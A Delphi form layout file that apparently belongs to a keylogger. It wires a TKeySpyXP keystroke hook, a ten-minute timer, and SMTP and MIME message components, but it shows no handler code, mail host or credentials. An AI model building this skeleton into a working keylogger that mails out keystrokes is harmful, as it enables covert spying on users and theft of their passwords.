object Form1: TForm1
  Left = 192
  Top = 114
  Width = 1088
  Height = 563
  Caption = 'Form1'
  Color = clBtnFace
  Font.Charset = DEFAULT_CHARSET
  Font.Color = clWindowText
  Font.Height = -11
  Font.Name = 'MS Sans Serif'
  Font.Style = []
  OldCreateOrder = False
  OnCreate = FormCreate
  PixelsPerInch = 96
  TextHeight = 13
  object Memo1: TMemo
    Left = 160
    Top = 32
    Width = 185
    Height = 89
    Lines.Strings = (
      'Memo1')
    TabOrder = 0
  end
  object KeySpyXP1: TKeySpyXP
    Author = 'n_a_v_'
    Enabled = True
    KeyWord.Keyword_Input_Type = KitOneAfterAnother
    KeyWord.Caps_Lock = KbsDontCare
    KeyWord.Num_Lock = KbsDontCare
    KeyWord.Scroll_Lock = KbsDontCare
    OnKey = KeySpyXP1Key
    Left = 32
    Top = 24
  end
  object Timer1: TTimer
    OnTimer = Timer1Timer
    Left = 80
    Top = 24
  end
  object Timer2: TTimer
    Interval = 600000
    OnTimer = Timer2Timer
    Left = 32
    Top = 80
  end
  object IdSMTP1: TIdSMTP
    MaxLineAction = maException
    ReadTimeout = 0
    Port = 25
    AuthenticationType = atLogin
    Left = 360
    Top = 24
  end
  object IdMessage1: TIdMessage
    AttachmentEncoding = 'MIME'
    BccList = <>
    CCList = <>
    Encoding = meMIME
    Recipients = <>
    ReplyTo = <>
    Left = 360
    Top = 64
  end
end
